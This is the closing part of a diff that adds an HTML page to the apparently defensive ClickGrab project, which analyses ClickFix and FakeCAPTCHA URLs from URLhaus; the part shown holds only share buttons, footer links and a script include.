+            <a href="https://twitter.com/intent/tweet?text=Emerging%20ClickGrab%20Campaign%3A%20Advanced%20Analysis%20of%202026-05-12%20Attack%20Patterns&url=https://mhaggis.github.io/ClickGrab/analysis/clickgrab-analysis-2026-05-12.html" class="share-btn-footer">Share on Twitter</a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://mhaggis.github.io/ClickGrab/analysis/clickgrab-analysis-2026-05-12.html" class="share-btn-footer">Share on LinkedIn</a>
+        </div>
+    </footer>
+</article>
+
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <span class="text-logo">CLICKGRAB</span>
+                    <p>Analyzing ClickFix and FakeCAPTCHA URLs from URLhaus</p>
+                </div>
+                <div class="footer-links">
+                    <h3>Resources</h3>
+                    <ul>
+                        <li><a href="/ClickGrab/analysis.html">Analysis</a></li>
+                        <li><a href="/ClickGrab/reports.html">Reports</a></li>
+                        <li><a href="/ClickGrab/techniques.html">Techniques</a></li>
+                <li><a href="/ClickGrab/mitigations.html">Mitigations</a></li>
+                        <li><a href="https://urlhaus.abuse.ch/" target="_blank">URLhaus</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h3>Connect</h3>
+                    <ul>
+                        <li><a href="https://github.com/MHaggis/clickgrab" target="_blank">GitHub</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 ClickGrab Project. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/ClickGrab/assets/js/main.js"></script>
+    
+</body>
+</html> 
